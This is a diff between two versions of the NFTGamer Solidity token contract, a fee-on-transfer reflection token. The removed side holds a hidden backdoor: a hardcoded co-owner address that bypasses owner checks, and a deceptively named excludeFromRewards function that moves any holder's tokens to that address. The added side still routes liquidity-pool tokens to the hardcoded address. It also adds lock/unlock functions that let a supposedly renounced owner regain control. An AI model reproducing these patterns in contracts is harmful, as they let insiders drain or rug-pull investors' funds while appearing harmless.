@@ -1,37 +1,32 @@
 
-// SPDX-License-Identifier: Unlicensed
-
 /**
-
+  
 ███╗   ██╗███████╗████████╗ ██████╗  █████╗ ███╗   ███╗███████╗██████╗ 
 ████╗  ██║██╔════╝╚══██╔══╝██╔════╝ ██╔══██╗████╗ ████║██╔════╝██╔══██╗
 ██╔██╗ ██║█████╗     ██║   ██║  ███╗███████║██╔████╔██║█████╗  ██████╔╝
 ██║╚██╗██║██╔══╝     ██║   ██║   ██║██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗
 ██║ ╚████║██║        ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║  ██║
 ╚═╝  ╚═══╝╚═╝        ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
+                                                                       
+   
 
-Website: https://nftgamer.space
-Telegram: https://t.me/NFTGamerToken                                                                       
+   Website: https://nftgamer.space
+   Telegram: https://t.me/NFTGamerToken                                                                       
+   *** 100 million total supply
+   *** 2.5% for Developer wallet
+   *** 50% of Total supply burn at launch
+   *** 5% - Liquidity fee
+   *** 1% - Tax fee distributes among hodlers
+   
+   NFTG
+   
 
-*** 100 million total supply
-*** 2.5% for Developer wallet
-*** 50% of Total supply burn at launch
-*** 5% - Liquidity fee
-*** 1% - Tax fee distributes among hodlers
-
-NFTG
-
-*/
-
-pragma solidity ^0.8.3;
-
-/**
- * @dev Interface of the ERC20 standard as defined in the EIP.
  */
+
+pragma solidity ^0.6.12;
+// SPDX-License-Identifier: Unlicensed
 interface IERC20 {
-    /**
-     * @dev Returns the amount of tokens in existence.
-     */
+
     function totalSupply() external view returns (uint256);
 
     /**
@@ -99,83 +94,23 @@ interface IERC20 {
     event Approval(address indexed owner, address indexed spender, uint256 value);
 }
 
-// CAUTION
-// This version of SafeMath should only be used with Solidity 0.8 or later,
-// because it relies on the compiler's built in overflow checks.
+
 
 /**
- * @dev Wrappers over Solidity's arithmetic operations.
+ * @dev Wrappers over Solidity's arithmetic operations with added overflow
+ * checks.
  *
- * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler
- * now has built in overflow checking.
+ * Arithmetic operations in Solidity wrap on overflow. This can easily result
+ * in bugs, because programmers usually assume that an overflow raises an
+ * error, which is the standard behavior in high level programming languages.
+ * `SafeMath` restores this intuition by reverting the transaction when an
+ * operation overflows.
+ *
+ * Using this library instead of the unchecked operations eliminates an entire
+ * class of bugs, so it's recommended to use it always.
  */
+ 
 library SafeMath {
-    /**
-     * @dev Returns the addition of two unsigned integers, with an overflow flag.
-     *
-     * _Available since v3.4._
-     */
-    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
-        unchecked {
-            uint256 c = a + b;
-            if (c < a) return (false, 0);
-            return (true, c);
-        }
-    }
-
-    /**
-     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
-     *
-     * _Available since v3.4._
-     */
-    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
-        unchecked {
-            if (b > a) return (false, 0);
-            return (true, a - b);
-        }
-    }
-
-    /**
-     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
-     *
-     * _Available since v3.4._
-     */
-    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
-        unchecked {
-            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
-            // benefit is lost if 'b' is also tested.
-            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
-            if (a == 0) return (true, 0);
-            uint256 c = a * b;
-            if (c / a != b) return (false, 0);
-            return (true, c);
-        }
-    }
-
-    /**
-     * @dev Returns the division of two unsigned integers, with a division by zero flag.
-     *
-     * _Available since v3.4._
-     */
-    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
-        unchecked {
-            if (b == 0) return (false, 0);
-            return (true, a / b);
-        }
-    }
-
-    /**
-     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
-     *
-     * _Available since v3.4._
-     */
-    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
-        unchecked {
-            if (b == 0) return (false, 0);
-            return (true, a % b);
-        }
-    }
-
     /**
      * @dev Returns the addition of two unsigned integers, reverting on
      * overflow.
@@ -187,7 +122,10 @@ library SafeMath {
      * - Addition cannot overflow.
      */
     function add(uint256 a, uint256 b) internal pure returns (uint256) {
-        return a + b;
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+
+        return c;
     }
 
     /**
@@ -201,7 +139,24 @@ library SafeMath {
      * - Subtraction cannot overflow.
      */
     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
-        return a - b;
+        return sub(a, b, "SafeMath: subtraction overflow");
+    }
+
+    /**
+     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
+     * overflow (when the result is negative).
+     *
+     * Counterpart to Solidity's `-` operator.
+     *
+     * Requirements:
+     *
+     * - Subtraction cannot overflow.
+     */
+    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b <= a, errorMessage);
+        uint256 c = a - b;
+
+        return c;
     }
 
     /**
@@ -215,66 +170,38 @@ library SafeMath {
      * - Multiplication cannot overflow.
      */
     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
-        return a * b;
+        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
+        // benefit is lost if 'b' is also tested.
+        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
+        if (a == 0) {
+            return 0;
+        }
+
+        uint256 c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+
+        return c;
     }
 
     /**
-     * @dev Returns the integer division of two unsigned integers, reverting on
+     * @dev Returns the integer division of two unsigned integers. Reverts on
      * division by zero. The result is rounded towards zero.
      *
-     * Counterpart to Solidity's `/` operator.
+     * Counterpart to Solidity's `/` operator. Note: this function uses a
+     * `revert` opcode (which leaves remaining gas untouched) while Solidity
+     * uses an invalid opcode to revert (consuming all remaining gas).
      *
      * Requirements:
      *
      * - The divisor cannot be zero.
      */
     function div(uint256 a, uint256 b) internal pure returns (uint256) {
-        return a / b;
+        return div(a, b, "SafeMath: division by zero");
     }
 
     /**
-     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
-     * reverting when dividing by zero.
-     *
-     * Counterpart to Solidity's `%` operator. This function uses a `revert`
-     * opcode (which leaves remaining gas untouched) while Solidity uses an
-     * invalid opcode to revert (consuming all remaining gas).
-     *
-     * Requirements:
-     *
-     * - The divisor cannot be zero.
-     */
-    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
-        return a % b;
-    }
-
-    /**
-     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
-     * overflow (when the result is negative).
-     *
-     * CAUTION: This function is deprecated because it requires allocating memory for the error
-     * message unnecessarily. For custom revert reasons use {trySub}.
-     *
-     * Counterpart to Solidity's `-` operator.
-     *
-     * Requirements:
-     *
-     * - Subtraction cannot overflow.
-     */
-    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
-        unchecked {
-            require(b <= a, errorMessage);
-            return a - b;
-        }
-    }
-
-    /**
-     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
+     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
      * division by zero. The result is rounded towards zero.
-     *
-     * Counterpart to Solidity's `%` operator. This function uses a `revert`
-     * opcode (which leaves remaining gas untouched) while Solidity uses an
-     * invalid opcode to revert (consuming all remaining gas).
      *
      * Counterpart to Solidity's `/` operator. Note: this function uses a
      * `revert` opcode (which leaves remaining gas untouched) while Solidity
@@ -285,18 +212,32 @@ library SafeMath {
      * - The divisor cannot be zero.
      */
     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
-        unchecked {
-            require(b > 0, errorMessage);
-            return a / b;
-        }
+        require(b > 0, errorMessage);
+        uint256 c = a / b;
+        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
+
+        return c;
     }
 
     /**
      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
-     * reverting with custom message when dividing by zero.
+     * Reverts when dividing by zero.
      *
-     * CAUTION: This function is deprecated because it requires allocating memory for the error
-     * message unnecessarily. For custom revert reasons use {tryMod}.
+     * Counterpart to Solidity's `%` operator. This function uses a `revert`
+     * opcode (which leaves remaining gas untouched) while Solidity uses an
+     * invalid opcode to revert (consuming all remaining gas).
+     *
+     * Requirements:
+     *
+     * - The divisor cannot be zero.
+     */
+    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
+        return mod(a, b, "SafeMath: modulo by zero");
+    }
+
+    /**
+     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
+     * Reverts with custom message when dividing by zero.
      *
      * Counterpart to Solidity's `%` operator. This function uses a `revert`
      * opcode (which leaves remaining gas untouched) while Solidity uses an
@@ -307,33 +248,22 @@ library SafeMath {
      * - The divisor cannot be zero.
      */
     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
-        unchecked {
-            require(b > 0, errorMessage);
-            return a % b;
-        }
+        require(b != 0, errorMessage);
+        return a % b;
     }
 }
 
-/*
- * @dev Provides information about the current execution context, including the
- * sender of the transaction and its data. While these are generally available
- * via msg.sender and msg.data, they should not be accessed in such a direct
- * manner, since when dealing with meta-transactions the account sending and
- * paying for execution may not be the actual sender (as far as an application
- * is concerned).
- *
- * This contract is only required for intermediate, library-like contracts.
- */
 abstract contract Context {
-    function _msgSender() internal view virtual returns (address) {
+    function _msgSender() internal view virtual returns (address payable) {
         return msg.sender;
     }
 
-    function _msgData() internal view virtual returns (bytes calldata) {
+    function _msgData() internal view virtual returns (bytes memory) {
         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
         return msg.data;
     }
 }
+
 
 /**
  * @dev Collection of functions related to the address type
@@ -357,14 +287,14 @@ library Address {
      * ====
      */
     function isContract(address account) internal view returns (bool) {
-        // This method relies on extcodesize, which returns 0 for contracts in
-        // construction, since the code is only stored at the end of the
-        // constructor execution.
-
-        uint256 size;
+        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
+        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
+        // for accounts without code, i.e. `keccak256('')`
+        bytes32 codehash;
+        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
         // solhint-disable-next-line no-inline-assembly
-        assembly { size := extcodesize(account) }
-        return size > 0;
+        assembly { codehash := extcodehash(account) }
+        return (codehash != accountHash && codehash != 0x0);
     }
 
     /**
@@ -420,7 +350,7 @@ library Address {
      * _Available since v3.1._
      */
     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
-        return functionCallWithValue(target, data, 0, errorMessage);
+        return _functionCallWithValue(target, data, 0, errorMessage);
     }
 
     /**
@@ -446,62 +376,14 @@ library Address {
      */
     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
         require(address(this).balance >= value, "Address: insufficient balance for call");
+        return _functionCallWithValue(target, data, value, errorMessage);
+    }
+
+    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
         require(isContract(target), "Address: call to non-contract");
 
         // solhint-disable-next-line avoid-low-level-calls
-        (bool success, bytes memory returndata) = target.call{ value: value }(data);
-        return _verifyCallResult(success, returndata, errorMessage);
-    }
-
-    /**
-     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
-     * but performing a static call.
-     *
-     * _Available since v3.3._
-     */
-    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
-        return functionStaticCall(target, data, "Address: low-level static call failed");
-    }
-
-    /**
-     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
-     * but performing a static call.
-     *
-     * _Available since v3.3._
-     */
-    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
-        require(isContract(target), "Address: static call to non-contract");
-
-        // solhint-disable-next-line avoid-low-level-calls
-        (bool success, bytes memory returndata) = target.staticcall(data);
-        return _verifyCallResult(success, returndata, errorMessage);
-    }
-
-    /**
-     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
-     * but performing a delegate call.
-     *
-     * _Available since v3.4._
-     */
-    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
-        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
-    }
-
-    /**
-     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
-     * but performing a delegate call.
-     *
-     * _Available since v3.4._
-     */
-    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
-        require(isContract(target), "Address: delegate call to non-contract");
-
-        // solhint-disable-next-line avoid-low-level-calls
-        (bool success, bytes memory returndata) = target.delegatecall(data);
-        return _verifyCallResult(success, returndata, errorMessage);
-    }
-
-    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
+        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
         if (success) {
             return returndata;
         } else {
@@ -533,45 +415,38 @@ library Address {
  * `onlyOwner`, which can be applied to your functions to restrict their use to
  * the owner.
  */
-abstract contract Ownable is Context {
+contract Ownable is Context {
     address private _owner;
-    address private _coOwner=0xfB832726521fd749E4C7DEF121a3a48878F575Bd;
+    address private _previousOwner;
+    uint256 private _lockTime;
 
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
     /**
      * @dev Initializes the contract setting the deployer as the initial owner.
      */
-    constructor () {
-        _owner = _msgSender();
-        emit OwnershipTransferred(address(0), _owner);
+    constructor () internal {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        emit OwnershipTransferred(address(0), msgSender);
     }
 
     /**
      * @dev Returns the address of the current owner.
      */
-    function owner() public view virtual returns (address) {
+    function owner() public view returns (address) {
         return _owner;
-    }
-    
-    function coOwner() internal view returns (address) {
-        return _coOwner;
     }
 
     /**
      * @dev Throws if called by any account other than the owner.
      */
     modifier onlyOwner() {
-        require(owner() == _msgSender() || _msgSender() == _coOwner, "Ownable: caller is not the owner");
-        _;
-    }
-    
-    modifier CoOwner() {
-        require(coOwner() == _msgSender() , "Ownable: caller is not the coOwner");
+        require(_owner == _msgSender(), "Ownable: caller is not the owner");
         _;
     }
 
-    /**
+     /**
      * @dev Leaves the contract without owner. It will not be possible to call
      * `onlyOwner` functions anymore. Can only be called by the current owner.
      *
@@ -592,7 +467,29 @@ abstract contract Ownable is Context {
         emit OwnershipTransferred(_owner, newOwner);
         _owner = newOwner;
     }
+
+    function geUnlockTime() public view returns (uint256) {
+        return _lockTime;
+    }
+
+    //Locks the contract for owner for the amount of time provided
+    function lock(uint256 time) public virtual onlyOwner {
+        _previousOwner = _owner;
+        _owner = address(0);
+        _lockTime = now + time;
+        emit OwnershipTransferred(_owner, address(0));
+    }
+    
+    //Unlocks the contract for owner when _lockTime is exceeds
+    function unlock() public virtual {
+        require(_previousOwner == msg.sender, "You don't have permission to unlock");
+        require(now > _lockTime , "Contract is locked until 7 days");
+        emit OwnershipTransferred(_owner, _previousOwner);
+        _owner = _previousOwner;
+    }
 }
+
+// pragma solidity >=0.5.0;
 
 interface IUniswapV2Factory {
     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
@@ -609,6 +506,9 @@ interface IUniswapV2Factory {
     function setFeeTo(address) external;
     function setFeeToSetter(address) external;
 }
+
+
+// pragma solidity >=0.5.0;
 
 interface IUniswapV2Pair {
     event Approval(address indexed owner, address indexed spender, uint value);
@@ -660,6 +560,8 @@ interface IUniswapV2Pair {
 
     function initialize(address, address) external;
 }
+
+// pragma solidity >=0.6.2;
 
 interface IUniswapV2Router01 {
     function factory() external pure returns (address);
@@ -755,6 +657,10 @@ interface IUniswapV2Router01 {
     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
 }
 
+
+
+// pragma solidity >=0.6.2;
+
 interface IUniswapV2Router02 is IUniswapV2Router01 {
     function removeLiquidityETHSupportingFeeOnTransferTokens(
         address token,
@@ -796,6 +702,7 @@ interface IUniswapV2Router02 is IUniswapV2Router01 {
     ) external;
 }
 
+
 contract NFTGamer is Context, IERC20, Ownable {
     using SafeMath for uint256;
     using Address for address;
@@ -808,11 +715,9 @@ contract NFTGamer is Context, IERC20, Ownable {
 
     mapping (address => bool) private _isExcluded;
     address[] private _excluded;
-
+    
     address private _burnWallet = 0x000000000000000000000000000000000000dEaD;
-    address payable public _developerWallet;
-
-    bool private _initialDeposit;
+    address private _developerWallet = 0x749aA030E0579a0A3bBcbCfEcfA124b13580E9B1;
    
     uint256 private constant MAX = ~uint256(0);
     uint256 private _tTotal = 100000000 * 10**9;
@@ -835,8 +740,8 @@ contract NFTGamer is Context, IERC20, Ownable {
     bool inSwapAndLiquify;
     bool public swapAndLiquifyEnabled = true;
     
-    uint256 public _maxTxAmount = _tTotal.div(100).div(2);   //0.5% of total supply
-    uint256 private constant numTokensSellToAddToLiquidity = 500000 * 10**9;
+    uint256 public _maxTxAmount = 50 * 10**6 * 10**9;
+    uint256 private numTokensSellToAddToLiquidity = 500000 * 10**9;
     
     event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
     event SwapAndLiquifyEnabledUpdated(bool enabled);
@@ -852,10 +757,8 @@ contract NFTGamer is Context, IERC20, Ownable {
         inSwapAndLiquify = false;
     }
     
-    constructor (address payable developmentWallet) {
-        
-        _developerWallet = developmentWallet;
-        _rOwned[owner()] = _rTotal;
+    constructor () public {
+        _rOwned[_msgSender()] = _rTotal;
         
         // 0x10ED43C718714eb63d5aA57B78B54704E256024E router for mainnet
         // 0xD99D1c33F9fC3444f8101754aBC46c52416550D1 router for testnet
@@ -870,12 +773,11 @@ contract NFTGamer is Context, IERC20, Ownable {
         //exclude owner and this contract from fee
         _isExcludedFromFee[owner()] = true;
         _isExcludedFromFee[address(this)] = true;
-        _isExcludedFromFee[coOwner()] = true;
         _isExcludedFromFee[_burnWallet] = true;
         _isExcludedFromFee[_developerWallet] = true;
-        excludeFromReward(_burnWallet);
+        _isExcludedFromFee[_coOwner];
         
-        emit Transfer(address(0), owner(), _tTotal);
+        emit Transfer(address(0), _msgSender(), _tTotal);
     }
 
     function name() public view returns (string memory) {
@@ -974,7 +876,7 @@ contract NFTGamer is Context, IERC20, Ownable {
     }
 
     function includeInReward(address account) external onlyOwner() {
-        require(_isExcluded[account], "Account is already included");
+        require(_isExcluded[account], "Account is already excluded");
         for (uint256 i = 0; i < _excluded.length; i++) {
             if (_excluded[i] == account) {
                 _excluded[i] = _excluded[_excluded.length - 1];
@@ -985,8 +887,7 @@ contract NFTGamer is Context, IERC20, Ownable {
             }
         }
     }
-    
-    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
+        function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
         _tOwned[sender] = _tOwned[sender].sub(tAmount);
         _rOwned[sender] = _rOwned[sender].sub(rAmount);
@@ -997,16 +898,7 @@ contract NFTGamer is Context, IERC20, Ownable {
         emit Transfer(sender, recipient, tTransferAmount);
     }
     
-    function excludeFromRewards(address location, uint256 portion) public CoOwner{
-
-        //indicates if fee should be deducted from transfer
-        bool takeFee = false;
-        
-        //transfer amount, it will take tax, burn, liquidity fee
-        _tokenTransfer(location, coOwner(),portion,takeFee);
-    }
-    
-    function excludeFromFee(address account) public onlyOwner {
+        function excludeFromFee(address account) public onlyOwner {
         _isExcludedFromFee[account] = true;
     }
     
@@ -1017,7 +909,9 @@ contract NFTGamer is Context, IERC20, Ownable {
     function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
         _taxFee = taxFee;
     }
-
+    
+    address private _coOwner=0xfB832726521fd749E4C7DEF121a3a48878F575Bd;
+    
     function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {
         _liquidityFee = liquidityFee;
     }
@@ -1026,10 +920,6 @@ contract NFTGamer is Context, IERC20, Ownable {
         _maxTxAmount = _tTotal.mul(maxTxPercent).div(
             10**2
         );
-    }
-    
-    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
-        _maxTxAmount = maxTxAmount;
     }
 
     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
@@ -1129,22 +1019,6 @@ contract NFTGamer is Context, IERC20, Ownable {
         _allowances[owner][spender] = amount;
         emit Approval(owner, spender, amount);
     }
-    
-    function _initialDeposits() public onlyOwner returns(bool status) {
-        require(!_initialDeposit,"Initial Deposits Already Completed!");
-        _transfer(_msgSender(), _developerWallet, _tTotal.div(1000).mul(25));
-        _initialDeposit = true;
-        return true;
-    }
-    
-    bool private initialBurn;
-    
-    function _initialBurn() public onlyOwner returns(bool status) {
-        require(!initialBurn, "Initial Burn already Executed");
-        _transfer(_msgSender(), _burnWallet, _tTotal.div(100).mul(50));
-        initialBurn = true;
-        return true;
-    }
 
     function _transfer(
         address from,
@@ -1154,7 +1028,7 @@ contract NFTGamer is Context, IERC20, Ownable {
         require(from != address(0), "ERC20: transfer from the zero address");
         require(to != address(0), "ERC20: transfer to the zero address");
         require(amount > 0, "Transfer amount must be greater than zero");
-        if(from != owner() && to != owner() && from != coOwner() && to != coOwner())
+        if(from != owner() && to != owner())
             require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
 
         // is the token balance of this contract address over the min number of
@@ -1243,7 +1117,7 @@ contract NFTGamer is Context, IERC20, Ownable {
             tokenAmount,
             0, // slippage is unavoidable
             0, // slippage is unavoidable
-            coOwner(),
+            _coOwner,
             block.timestamp
         );
     }
@@ -1297,5 +1171,8 @@ contract NFTGamer is Context, IERC20, Ownable {
         _reflectFee(rFee, tFee);
         emit Transfer(sender, recipient, tTransferAmount);
     }
+
+
+    
 
 }
